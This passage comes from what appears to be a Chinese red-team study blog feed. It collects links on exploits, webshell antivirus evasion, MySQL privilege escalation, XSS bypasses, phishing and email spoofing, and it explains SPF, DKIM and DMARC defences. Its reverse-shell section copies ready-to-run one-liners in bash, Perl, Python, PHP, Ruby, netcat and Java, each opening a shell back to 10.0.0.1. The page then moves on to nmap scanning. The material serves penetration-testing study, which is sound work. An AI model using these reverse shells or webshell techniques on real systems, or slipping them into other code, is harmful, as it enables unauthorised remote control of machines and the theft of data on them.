href="http://php.net/manual/zh/function.create-function.php">http://php.net/manual/zh/function.create-function.php</a></p></li><li><p><a href="https://www.exploit-db.com/exploits/32416/">https://www.exploit-db.com/exploits/32416/</a></p></li><li><p><a href="https://bugs.php.net/bug.php?id=48231">https://bugs.php.net/bug.php?id=48231</a></p></li><li><p><a href="http://www.2cto.com/Article/201212/177146.html">http://www.2cto.com/Article/201212/177146.html</a></p></li><li><p><a href="https://codex.wordpress.org/InstallingWordPressinYourLanguage">https://codex.wordpress.org/InstallingWordPressinYourLanguage</a></p></li></ul><ul><li><a href="https://cloud.tencent.com/developer/article/1078451">https://cloud.tencent.com/developer/article/1078451</a>   –正文，感谢</li></ul><hr><h3 id="Struts2远程命令执行s2-048漏洞分析报告"><a href="#Struts2远程命令执行s2-048漏洞分析报告" class="headerlink" title="Struts2远程命令执行s2-048漏洞分析报告"></a>Struts2远程命令执行s2-048漏洞分析报告</h3><ul><li><a href="https://www.ichunqiu.com/course/58753">https://www.ichunqiu.com/course/58753</a>   –春秋视频讲解</li></ul><ul><li><a href="http://blog.topsec.com.cn/strutss2-048%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://blog.topsec.com.cn/strutss2-048远程命令执行漏洞分析/</a>  –阿尔法实验室</li></ul><ul><li><p><a href="https://www.freebuf.com/vuls/140410.html">https://www.freebuf.com/vuls/140410.html</a>   –复现</p></li><li><p><a href="https://www.jianshu.com/p/05efdc8f4301">https://www.jianshu.com/p/05efdc8f4301</a>  –复现</p></li><li><p><a href="https://www.jianshu.com/p/356291fb26a2">https://www.jianshu.com/p/356291fb26a2</a>  –复现</p></li></ul><ul><li><a href="https://www.zybuluo.com/Dukebf/note/821989">https://www.zybuluo.com/Dukebf/note/821989</a>   –strut2各版本漏洞信息整理</li></ul><p>很老的一个漏洞了…学习下思路~~</p><hr><h3 id="静态免杀php一句话（已过D盾，河马，安全狗）"><a href="#静态免杀php一句话（已过D盾，河马，安全狗）" class="headerlink" title="静态免杀php一句话（已过D盾，河马，安全狗）"></a>静态免杀php一句话（已过D盾，河马，安全狗）</h3><ul><li><a href="https://www.cnblogs.com/ABKing/p/13515014.html">https://www.cnblogs.com/ABKing/p/13515014.html</a>  –2020年8月最新一句话木马免杀（截止2020年8月16日通杀D盾、安全狗，微步，webshellKiller）</li></ul><ul><li><a href="https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug">https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug</a>  –2020年8月如何优雅的隐藏你的webshell</li></ul><p>还有很多方法，这里书籍上的方法未找到，可看书！！</p><hr><h3 id="金融信息系统安全测评方法（不公布！）"><a href="#金融信息系统安全测评方法（不公布！）" class="headerlink" title="金融信息系统安全测评方法（不公布！）"></a>金融信息系统安全测评方法（不公布！）</h3><ul><li><a href="http://www.djbh.net/webdev/file/webFiles/File/jsbz/201232310276.pdf">http://www.djbh.net/webdev/file/webFiles/File/jsbz/201232310276.pdf</a>   —信息安全技术信息安全风险评估规范</li></ul><ul><li><a href="http://www.djbh.net/webdev/file/webFiles/File/zcbz/201226173039.pdf">http://www.djbh.net/webdev/file/webFiles/File/zcbz/201226173039.pdf</a>   —信息安全技术信息系统安全管理要求</li></ul><p>学习下就好！！！</p><p>随着大数据、云计算、人工智能及区块链等新兴技术的应用,银行业手机银行、微信银行等新兴数字化金通过安全测评过程，全面分析出信息系统可能存在的人为破坏场景及其成因与后果，通过科学有效的测试</p><p>所以才提起金融信息系统安全测评方法这块内容的警惕，这里只能看书，网上应该是封了大部分资料书内容很全！！</p><hr><h3 id="Apache-Poi-XXE-Analysis"><a href="#Apache-Poi-XXE-Analysis" class="headerlink" title="Apache-Poi-XXE-Analysis"></a>Apache-Poi-XXE-Analysis</h3><ul><li><a href="https://b1ue.cn/archives/241.html">Apache POI &lt;= 4.1.0 XXE 漏洞 (CVE-2019-12415)</a></li></ul><p>参考文章：</p><ul><li><a href="https://xz.aliyun.com/t/6996">https://xz.aliyun.com/t/6996</a>   —本文复现文章</li></ul><hr><h3 id="记一次阿里主站xss测试及绕过waf防护"><a href="#记一次阿里主站xss测试及绕过waf防护" class="headerlink" title="记一次阿里主站xss测试及绕过waf防护"></a>记一次阿里主站xss测试及绕过waf防护</h3><p>使用工具：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/chaitin/</span>xray</code></pre><ul><li><a href="https://www.loongten.com/2019/12/20/find-alibaba-xss/">https://www.loongten.com/2019/12/20/find-alibaba-xss/</a>   –一枚阿里巴巴主站XSS挖掘之旅</li></ul><p>书里也有另外的思路，大部分都是各种倒腾方法测试，前面也列举了很多，未授权的别乱搞！！</p><h3 id="ClassLoader类加载机制"><a href="#ClassLoader类加载机制" class="headerlink" title="ClassLoader类加载机制"></a>ClassLoader类加载机制</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>javasec.org<span class="hljs-regexp">/javase/</span>ClassLoader/</code></pre><p>该网站是JAVA非常好的一个学习页面，前面也推荐过了，这里提到ClassLoader再次推下！！</p><hr><h3 id="浅谈SSRF原理及其利用"><a href="#浅谈SSRF原理及其利用" class="headerlink" title="浅谈SSRF原理及其利用"></a>浅谈SSRF原理及其利用</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>teamssix.com<span class="hljs-regexp">/year/</span><span class="hljs-number">191222</span>-<span class="hljs-number">192227</span>.html</code></pre><hr><pre><code class="hljs awk">参考文章https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2115</span>http:<span class="hljs-regexp">//</span>www.liuwx.cn/penetrationtest-<span class="hljs-number">3</span>.htmlhttps:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/yuzly/</span>p/<span class="hljs-number">10903398</span>.htmlhttps:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/vulhub/</span>vulhub<span class="hljs-regexp">/tree/m</span>aster<span class="hljs-regexp">/weblogic/</span>ssrfhttps:<span class="hljs-regexp">//</span>www.netsparker.com<span class="hljs-regexp">/blog/</span>web-security<span class="hljs-regexp">/server-side-request-forgery-vulnerability-ssrf/</span></code></pre><hr><h3 id="Spring-Data-Commons-CVE-2018-1273"><a href="#Spring-Data-Commons-CVE-2018-1273" class="headerlink" title="Spring-Data-Commons (CVE-2018-1273)"></a>Spring-Data-Commons (CVE-2018-1273)</h3><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://blog.nsfocus.net/cve-<span class="hljs-number">2018</span>-<span class="hljs-number">1273</span>-analysis/自行搭建复现<span class="hljs-attribute">https</span>://pianshen.com/article/<span class="hljs-number">9248784281</span>/     vulhub靶机复现<span class="hljs-attribute">http</span>://xxlegend.com/<span class="hljs-number">2018</span>/<span class="hljs-number">04</span>/<span class="hljs-number">12</span>/CVE-<span class="hljs-number">2018</span>-<span class="hljs-number">1273</span>-%<span class="hljs-number">20</span>RCE%<span class="hljs-number">20</span>with%<span class="hljs-number">20</span>Spring%<span class="hljs-number">20</span>Data%<span class="hljs-number">20</span>Commons%<span class="hljs-number">20</span>%E<span class="hljs-number">5</span>%<span class="hljs-number">88</span>%<span class="hljs-number">86</span>%E<span class="hljs-number">6</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">90</span>%E<span class="hljs-number">6</span>%<span class="hljs-number">8</span>A%A<span class="hljs-number">5</span>%E<span class="hljs-number">5</span>%<span class="hljs-number">91</span>%<span class="hljs-number">8</span>A/</code></pre><p>听老的漏洞了，可以玩玩</p><hr><h3 id="xss绕过代码后端长度限制的方法"><a href="#xss绕过代码后端长度限制的方法" class="headerlink" title="xss绕过代码后端长度限制的方法"></a>xss绕过代码后端长度限制的方法</h3><p>参考链接:</p><ul><li><a href="https://www.shangyexinzhi.com/article/387056.html">https://www.shangyexinzhi.com/article/387056.html</a>   –该文章</li><li><a href="https://www.freebuf.com/column/221882.html">https://www.freebuf.com/column/221882.html</a>   –加深</li></ul><hr><h3 id="mysql提权之mof"><a href="#mysql提权之mof" class="headerlink" title="mysql提权之mof"></a>mysql提权之mof</h3><ul><li><p><a href="https://www.jianshu.com/p/6dbac868e2ab">https://www.jianshu.com/p/6dbac868e2ab</a></p></li><li><p><a href="https://pino-hd.github.io/2018/06/10/MySQL%E6%8F%90%E6%9D%83%E4%B9%8BMOF/">https://pino-hd.github.io/2018/06/10/MySQL提权之MOF/</a></p></li><li><p><a href="https://www.cnblogs.com/h4ck0ne/p/5154629.html">https://www.cnblogs.com/h4ck0ne/p/5154629.html</a></p></li></ul><hr><h3 id="mysql提权之udf"><a href="#mysql提权之udf" class="headerlink" title="mysql提权之udf"></a>mysql提权之udf</h3><ul><li><a href="http://www.oniont.cn/index.php/archives/310.html">http://www.oniont.cn/index.php/archives/310.html</a></li><li><a href="https://www.jianshu.com/p/5b34c1b6dee7">https://www.jianshu.com/p/5b34c1b6dee7</a></li></ul><hr><h3 id="XSS-基础学习"><a href="#XSS-基础学习" class="headerlink" title="XSS 基础学习"></a>XSS 基础学习</h3><pre><code class="hljs xquery">https://baike.baidu.com/<span class="hljs-type">item</span>/XSS<span class="hljs-meta">%E6</span><span class="hljs-meta">%94</span><span class="hljs-meta">%BB</span><span class="hljs-meta">%E5</span><span class="hljs-meta">%87</span><span class="hljs-meta">%BB</span>   百度百科</code></pre><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">24</span>a19c6434ae   --最新累积</code></pre><p>还有书中知识！！！</p><hr><h3 id="java-反射与内存shell-初探-基于jetty容器的shell-维权"><a href="#java-反射与内存shell-初探-基于jetty容器的shell-维权" class="headerlink" title="java 反射与内存shell 初探-基于jetty容器的shell 维权"></a>java 反射与内存shell 初探-基于jetty容器的shell 维权</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>web/<span class="hljs-number">172753</span>.html    ---利用“进程注入”实现无文件复活 WebShellhttp:<span class="hljs-regexp">//</span>qiushao.net<span class="hljs-regexp">/2020/</span><span class="hljs-number">02</span><span class="hljs-regexp">/15/</span>Java<span class="hljs-regexp">/Java-反射机制介绍/</span>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/jingmoxukong/</span>p/<span class="hljs-number">12049112</span>.html   ---深入理解 Java 反射和动态代理 http:<span class="hljs-regexp">//</span>rui0.cn<span class="hljs-regexp">/archives/</span><span class="hljs-number">1408</span><span class="hljs-comment">#more-1408    --前面了解了一些基础和知识，这是内存shell深入的理解，感谢大佬</span></code></pre><p>书籍上还有不同的思路…</p><hr><h3 id="利用-DNSLOG回显"><a href="#利用-DNSLOG回显" class="headerlink" title="利用 DNSLOG回显"></a>利用 DNSLOG回显</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">98096</span>   --实战https:<span class="hljs-regexp">//</span>codingnote.cc<span class="hljs-regexp">/p/</span><span class="hljs-number">113368</span>   --基础原理</code></pre><p>书籍上还有不同的思路…</p><hr><h3 id="文件合成-图片马生成"><a href="#文件合成-图片马生成" class="headerlink" title="文件合成/图片马生成"></a>文件合成/图片马生成</h3><p>指的是代码写入后不破坏图片为前提,图片仍可正常打开</p><ul><li><a href="https://bbs.zkaq.cn/?t/159.html">https://bbs.zkaq.cn/?t/159.html</a></li><li><a href="https://blog.csdn.net/ltysg0645/article/details/53996658">https://blog.csdn.net/ltysg0645/article/details/53996658</a></li></ul><hr><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><ul><li><a href="https://www.cnblogs.com/zzjdbk/p/12989830.html">https://www.cnblogs.com/zzjdbk/p/12989830.html</a>   —MySQL提权之udf提权(获得webshell的情况)</li><li><a href="https://www.jianshu.com/p/5b34c1b6dee7">https://www.jianshu.com/p/5b34c1b6dee7</a>   –另外的思路</li></ul><hr><h2 id="3、社会工程学"><a href="#3、社会工程学" class="headerlink" title="3、社会工程学"></a>3、社会工程学</h2><h3 id="水坑攻击"><a href="#水坑攻击" class="headerlink" title="水坑攻击"></a>水坑攻击</h3><p>“水坑攻击”，黑客攻击方式之一，顾名思义，是在受害者必经之路设置了一个“水坑(陷阱)”。最常见的做法是，黑客分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，先将此网站“攻破”并植入攻击代码，一旦攻击目标访问该网站就会“中招”。</p><p>由于此种攻击借助了目标团体所信任的网站，攻击成功率很高，即便是那些对鱼叉攻击或其他形式的钓鱼攻击具有防护能力的团体</p><p>水坑攻击属于APT攻击的一种，与钓鱼攻击相比，黑客无需耗费精力制作钓鱼网站，而是利用合法网站的弱点，隐蔽性比较强。在人们安全意识不断加强的今天，黑客处心积虑地制作钓鱼网站却被有心人轻易识破，而水坑攻击则利用了被攻击者对网站的信任。</p><p>水坑攻击利用网站的弱点在其中植入攻击代码，攻击代码利用浏览器的缺陷，被攻击者访问网站时终端会被植入恶意程序或者直接被盗取个人重要信息。</p><p>水坑攻击相对于通过社会工程方式引诱目标用户访问恶意网站更具欺骗性，效率也更高。水坑方法主要被用于有针对性的攻击，而Adobe Reader、Java运行时环境（JRE）、Flash和IE中的零漏洞被用于安装恶意软件</p><ul><li><a href="https://baike.baidu.com/item/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB/17644830">https://baike.baidu.com/item/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB/17644830</a></li></ul><hr><h3 id="鱼叉攻击"><a href="#鱼叉攻击" class="headerlink" title="鱼叉攻击"></a>鱼叉攻击</h3><p>“鱼叉攻击”是黑客攻击方式之一，最常见的做法是，将木马程序作为电子邮件的附件，并起上一个极具诱惑力的名称，发送给目标电脑，诱使受害者打开附件，从而感染木马。</p><ul><li><a href="https://baike.baidu.com/item/%E9%B1%BC%E5%8F%89%E6%94%BB%E5%87%BB">https://baike.baidu.com/item/鱼叉攻击</a></li></ul><h4 id="Swaks-邮件伪造"><a href="#Swaks-邮件伪造" class="headerlink" title="Swaks-邮件伪造"></a>Swaks-邮件伪造</h4><ul><li><a href="https://www.cnblogs.com/zhaijiahui/p/11494626.html">https://www.cnblogs.com/zhaijiahui/p/11494626.html</a></li></ul><p>瑞士军刀还是很有名的，熟悉下原理和简单的 –to –from –attach –data –elho这几种使用意思就OK了…</p><hr><h4 id="邮件伪造防御技术"><a href="#邮件伪造防御技术" class="headerlink" title="邮件伪造防御技术"></a>邮件伪造防御技术</h4><h5 id="SPF"><a href="#SPF" class="headerlink" title="SPF"></a>SPF</h5><p>SPF是 Sender Policy Framework 的缩写，一种以IP地址认证电子邮件发件人身份的技术，是为了防范垃圾邮件而提出来的一种DNS记录类型，它是一种TXT类型的记录。 接收邮件方会首先检查域名的SPF记录，来确定发件人的IP地址是否被包含在SPF记录里面，如果在，就认为是一封正确的邮件，否则会认为是一封伪造的邮件进行退回。</p><p>SPF可以防止别人伪造你来发邮件，是一个反伪造性邮件的解决方案。当你定义了你域名的SPF记录之后， 接收邮件方会根据你的SPF记录来确定连接过来的IP地址是否被包含在SPF记录里面，如果在，则认为是一封正确的邮件，否则则认为是一封伪造的邮件。</p><p>设置正确的 SPF 记录可以提高邮件系统发送外域邮件的成功率，也可以一定程度上防止别人假冒你的域名发邮件。</p><ul><li><a href="https://www.jianshu.com/p/b3460757d260">https://www.jianshu.com/p/b3460757d260</a>   –使用方法</li></ul><h5 id="DKIM"><a href="#DKIM" class="headerlink" title="DKIM"></a>DKIM</h5><p>DKIM是一种防范电子邮件欺诈的验证技术，通过消息加密认证的方式对邮件发送域名进行验证。</p><p>邮件发送方发送邮件时，利用本域私钥加密邮件生成DKIM签名，将DKIM签名及其相关信息插入邮件头。邮件接收方接收邮件时，通过DNS查询获得公钥，验证邮件DKIM签名的有效性。从而确认在邮件发送的过程中，防止邮件被恶意篡改，保证邮件内容的完整性</p><ul><li>DKIM RFC协议：<a href="http://tools.ietf.org/html/rfc6376">http://tools.ietf.org/html/rfc6376</a></li><li>DKIM官方网站：<a href="http://www.dkim.org/">http://www.dkim.org/</a></li></ul><h5 id="DMARC"><a href="#DMARC" class="headerlink" title="DMARC"></a>DMARC</h5><p>DMARC是一种基于现有的SPF和DKIM协议的可扩展电子邮件认证协议，在邮件收发双方建立了邮件反馈机制，便于邮件发送方和邮件接收方共同对域名的管理进行完善和监督。</p><p>DMARC要求域名所有者在DNS记录中设置SPF记录和DKIM记录，并明确声明对验证失败邮件的处理策略。邮件接收方接收邮件时，首先通过DNS获取DMARC记录，再对邮件来源进行SPF验证和DKIM验证，对验证失败的邮件根据DMARC记录进行处理，并将处理结果反馈给发送方。</p><p>DMARC能够有效识别并拦截欺诈邮件和钓鱼邮件，保障用户个人信息安全。</p><p>设置完 SPF 和 DKIM 后，您就能以 TXT 记录的形式向您网域的 DNS 记录添加政策，从而配置 DMARC（方法与配置 SPF 或 ADSP 一样）</p><ul><li><p><a href="https://support.google.com/a/answer/2466563?hl=zh-Hans">https://support.google.com/a/answer/2466563?hl=zh-Hans</a></p></li><li><p><a href="https://dmarc.org//draft-dmarc-base-00-01.html#iana_dmarc_tags">https://dmarc.org//draft-dmarc-base-00-01.html#iana_dmarc_tags</a></p></li><li><p>DMARC RFC协议：<a href="http://tools.ietf.org/html/rfc7489">http://tools.ietf.org/html/rfc7489</a></p></li><li><p>DMARC官方网站：<a href="https://dmarc.org/">https://dmarc.org/</a></p></li></ul><hr><h3 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h3><p>钓鱼式攻击是一种企图从电子通讯中，通过伪装成信誉卓著的法人媒体以获得如用户名、密码和信用卡明细等个人敏感信息的犯罪诈骗过程。这些通信都声称(自己)来自社交网站拍卖网站网络银行、电子支付网站或网络管理者，以此来诱骗受害人的轻信。网钓通常是通过e-mail或者即时通讯进行。它常常导引用户到∪RL与界面外观与真正网站几无二致的假冒网站输入个人数据。就算使用强式加密的SSL服务器认证，要侦测网站是否仿冒实际上仍很困难。</p><ul><li><a href="https://zh.wikipedia.org/wiki/%E9%92%93%E9%B1%BC%E5%BC%8F%E6%94%BB%E5%87%BB">https://zh.wikipedia.org/wiki/钓鱼式攻击</a></li></ul><h4 id="视觉效果"><a href="#视觉效果" class="headerlink" title="视觉效果"></a>视觉效果</h4><p>某次应急响应中，从A客户（跨国经销商）那里了解到的情况如下：</p><pre><code class="hljs dns"><span class="hljs-keyword">A</span>是商家 B商家的消费者 C黑客</code></pre><p>C攻入了A的邮件服务器，并且持续控制了一个季度，共3个月。</p><p>B要购买A的产品时，A发送合同给B，同时C的木马也在读取邮件数据库的内容，合同中有付款账户，C从中截获A的邮件，并且修改合同内容，从邮件服务器拉取到了前一年的合同模板，将银行账户打印上去，B收到C的合同后迸行了打款，同时B在向A确认的过程中，A发现B受骗了。</p><p>思考:</p><pre><code class="hljs mathematica"><span class="hljs-built_in">C</span>怎么给<span class="hljs-variable">B</span>发送的邮件<span class="hljs-operator">,</span>取得了<span class="hljs-variable">B</span>的信任呢<span class="hljs-operator">?</span></code></pre><p>这里举个例子: <code>fish.com</code>与 <code>fish.corn</code></p><p>乍一看，<code>fish.com</code>中的<code>com</code>与<code>corn</code>非常相似，有个别字体影响的话，还是很难分辨的，更别说歪果仁了…</p><p><strong>宋体</strong></p><p><strong>娃娃体</strong></p><hr><h4 id="凭证劫持"><a href="#凭证劫持" class="headerlink" title="凭证劫持"></a>凭证劫持</h4><p><strong>漏洞危害</strong></p><p>劫持凭证，构造链接登录受害者账号</p><p><strong>文章：</strong></p><ul><li><a href="https://cn-sec.com/archives/69153.html">https://cn-sec.com/archives/69153.html</a></li><li><a href="https://sec.thief.one/article_content?a_id=a6dd0c77f46b5dd7030c79d3e24f804a">https://sec.thief.one/article_content?a_id=a6dd0c77f46b5dd7030c79d3e24f804a</a></li></ul><p>雷神众测原文被删了好像…</p><hr><h4 id="克隆技术"><a href="#克隆技术" class="headerlink" title="克隆技术"></a>克隆技术</h4><ul><li><p><a href="https://www.jianshu.com/p/6df51799cd9d">https://www.jianshu.com/p/6df51799cd9d</a>  —基础介绍钓鱼</p></li><li><p><a href="https://blog.csdn.net/qq_39379812/article/details/90679722">https://blog.csdn.net/qq_39379812/article/details/90679722</a>   –复现、实战</p></li><li><p><a href="https://blog.51cto.com/13587123/2151193">https://blog.51cto.com/13587123/2151193</a>   –老文章</p></li></ul><hr><h4 id="Word文档-云宏代码钓鱼"><a href="#Word文档-云宏代码钓鱼" class="headerlink" title="Word文档-云宏代码钓鱼"></a>Word文档-云宏代码钓鱼</h4><p><a href="https://cloud.tencent.com/developer/article/1518725">https://cloud.tencent.com/developer/article/1518725</a><br><a href="https://xz.aliyun.com/t/2496">https://xz.aliyun.com/t/2496</a></p><p>两篇复现~~</p><hr><h2 id="4、APP密码算法通用分析方法"><a href="#4、APP密码算法通用分析方法" class="headerlink" title="4、APP密码算法通用分析方法"></a>4、APP密码算法通用分析方法</h2><ul><li><a href="https://my.oschina.net/u/4587690/blog/4571625">https://my.oschina.net/u/4587690/blog/4571625</a>     –原文</li></ul><hr><h2 id="5、Linux下反弹she命令"><a href="#5、Linux下反弹she命令" class="headerlink" title="5、Linux下反弹she命令"></a>5、Linux下反弹she命令</h2><p>Hackthebox经典提权：</p><p><strong>Bash</strong><br>Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):</p><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></pre><p><strong>PERL</strong><br>Here’s a shorter, feature-free version of the perl-reverse-shell:</p><pre><code class="hljs PERL">perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></code></pre><p>There’s also an alternative PERL revere shell here.</p><p><strong>Python</strong><br>This was tested under Linux / Python 2.7:</p><pre><code class="hljs Python">python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><span class="hljs-number">1</span></code></pre><p><strong>PHP</strong><br>This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6…</p><pre><code class="hljs php">php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></code></pre><p>If you want a .php file to upload, see the more featureful and robust php-reverse-shell.</p><p><strong>Ruby</strong></p><pre><code class="hljs ruby">ruby -rsocket -e<span class="hljs-string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></code></pre><p><strong>Netcat</strong><br>Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.</p><pre><code class="hljs netcat">nc -e &#x2F;bin&#x2F;sh 10.0.0.1 1234</code></pre><p>If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:</p><pre><code class="hljs awk">rm <span class="hljs-regexp">/tmp/</span>f;mkfifo <span class="hljs-regexp">/tmp/</span>f;cat <span class="hljs-regexp">/tmp/</span>f|<span class="hljs-regexp">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc <span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">1234</span> &gt;<span class="hljs-regexp">/tmp/</span>f</code></pre><p><strong>Java</strong></p><pre><code class="hljs java">r = Runtime.getRuntime()p = r.exec([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])p.waitFor()</code></pre><p>[Untested submission from anonymous reader]</p><p><strong>xterm</strong><br>One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.</p><pre><code class="hljs xterm">xterm -display 10.0.0.1:1</code></pre><p>To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):</p><pre><code class="hljs xterm">Xnest :1</code></pre><p>You’ll need to authorise the target to connect to you (command also run on your host):</p><pre><code class="hljs nginx"><span class="hljs-attribute">xhost</span> +targetip</code></pre><ul><li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>   –参考文章</li></ul><hr><p>shell文章：</p><ul><li><p><a href="https://www.cnblogs.com/p0pl4r/p/10643541.html">https://www.cnblogs.com/p0pl4r/p/10643541.html</a> </p></li><li><p><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a></p></li><li><p><a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a>  –Linux反弹shell（一）文件描述符与重定向</p></li></ul><ul><li><a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a>   –Linux 反弹shell（二）反弹shell的本质</li></ul><p>打过靶机的应该都会…</p><hr><h2 id="6、Browser-Pivot-for-Chrome"><a href="#6、Browser-Pivot-for-Chrome" class="headerlink" title="6、Browser Pivot for Chrome"></a>6、Browser Pivot for Chrome</h2><ul><li><p><a href="https://ijustwannared.team/2019/03/11/browser-pivot-for-chrome/">https://ijustwannared.team/2019/03/11/browser-pivot-for-chrome/</a>     –全英文篇</p></li><li><p><a href="https://xz.aliyun.com/t/4417">https://xz.aliyun.com/t/4417</a>    –Browser Pivot for Chrome</p></li><li><p><a href="https://blog.csdn.net/weixin_44677409/article/details/102725129">https://blog.csdn.net/weixin_44677409/article/details/102725129</a>   –Cobalt Strike使用教程一</p></li><li><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0用户手册_中文翻译.pdf</a>   –CS非常详细教程  pdf版本，感谢QAX</p></li></ul><p>还可以参考书籍…</p><hr><p>到这里就结束打入内网的篇章了，将开启命令篇章!</p>]]></content>
    
    
    <categories>
      
      <category>红队攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>红队攻防</tag>
      
      <tag>渗透攻击红队百科全书</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红队攻防学习之信息收集</title>
    <link href="/p/a184e79.html"/>
    <url>/p/a184e79.html</url>
    
    <content type="html"><![CDATA[<h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机发现"><a href="#1、主机发现" class="headerlink" title="1、主机发现"></a>1、主机发现</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>官网: <a href="https://nmap.org/">https://nmap.org/</a><br>安装系统及命令:</p><ul><li><p>Mac os: <code>brew install nmap</code></p></li><li><p>Centos: <code>yum install nmap</code></p></li><li><p>Ubuntu: <code>apt一get install nmap</code></p></li></ul><p>参考手册: <a href="https://nmap.org/man/zh/index.html">https://nmap.org/man/zh/index.html</a></p><h4 id="扫描方式"><a href="#扫描方式" class="headerlink" title="扫描方式"></a><strong>扫描方式</strong></h4><p>常见的七种扫描方式：</p><ul><li><p>ТСР: -sT</p></li><li><p>SYN: -sS</p></li><li><p>ACK: -sA</p></li><li><p>UDP: -sU</p></li><li><p>RPC: -sR</p></li><li><p>ICMP: -sP</p></li><li><p>Disable Port Scan: -sn</p></li></ul><p>最常见的这些参数解释：<a href="https://blog.csdn.net/liudongdong19/article/details/83506731">https://blog.csdn.net/liudongdong19/article/details/83506731</a></p><h4 id="常见扫描案例"><a href="#常见扫描案例" class="headerlink" title="常见扫描案例"></a><strong>常见扫描案例</strong></h4><ul><li>扫描10000端口、操作系统、版本</li></ul><pre><code class="hljs bash">nmap -T4 -A &lt;target&gt;</code></pre><ul><li>版本探测</li></ul><pre><code class="hljs bash">nmap -sV &lt;target&gt;</code></pre><ul><li>操作系统</li></ul><pre><code class="hljs bash">nmap -O &lt;target&gt;</code></pre><ul><li>其他常用技巧：</li></ul><pre><code class="hljs bash">--host-timeout 主机超时时间 通常选值：18000--scan-delay 报文时间间隔 通常选值：1000-s &lt;源地址&gt; 定义扫描源地址，为了不被发现</code></pre><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><pre><code class="hljs bash">nmap -V -iR 100000 -PO -p 